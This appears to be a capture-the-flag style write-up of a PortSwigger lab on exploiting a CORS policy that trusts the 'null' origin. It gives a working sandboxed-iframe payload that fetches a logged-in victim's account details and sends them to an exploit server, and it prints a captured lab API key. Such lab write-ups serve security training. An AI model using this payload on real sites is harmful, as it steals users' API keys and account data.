![image](https://github.com/udayk01/Web-Security/assets/52235763/2d167b03-d05c-4e77-a305-ac5fa27505c6)

## Solution:

> Check intercept is off, then use Burp's browser to log in to your account. Click "My account".

![image](https://github.com/udayk01/Web-Security/assets/52235763/c1b53cdf-e631-4817-ac27-b4c19d75df59)

> Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

![image](https://github.com/udayk01/Web-Security/assets/52235763/60b4960d-d365-412d-90c4-ff64c0819ead)

> Send the request to Burp Repeater, and resubmit it with the added header ```Origin: null```.

![image](https://github.com/udayk01/Web-Security/assets/52235763/8ab705b0-2890-4952-9d73-676b98c76aeb)

>> Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.

> In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
![image](https://github.com/udayk01/Web-Security/assets/52235763/c079d6f9-8561-4d05-986c-6a80510e1722)

>> Notice the use of an iframe sandbox as this generates a null origin request.

> Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.

![image](https://github.com/udayk01/Web-Security/assets/52235763/afdeb841-1ac7-4163-83bb-c4bab4a530b6)

> Go back to the exploit server and click "Deliver exploit to victim".

> Click "Access log", retrieve and submit the victim's API key to complete the lab.

![image](https://github.com/udayk01/Web-Security/assets/52235763/8f4a9cd5-ea3f-414a-912b-d58386528bff)

![image](https://github.com/udayk01/Web-Security/assets/52235763/b4281930-2bbb-40ca-9e64-21fd1b66579a)

> API key: ``` NVPr6QPCDILosL40GAbK6YxGvuHT8e0B```

![Screenshot 2024-04-20 121206](https://github.com/udayk01/Web-Security/assets/52235763/df4f2286-2e58-48ad-bebd-64cc66b70049)

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/7cd5f1e0-72cf-4b09-a1e8-34de1e16dde1)



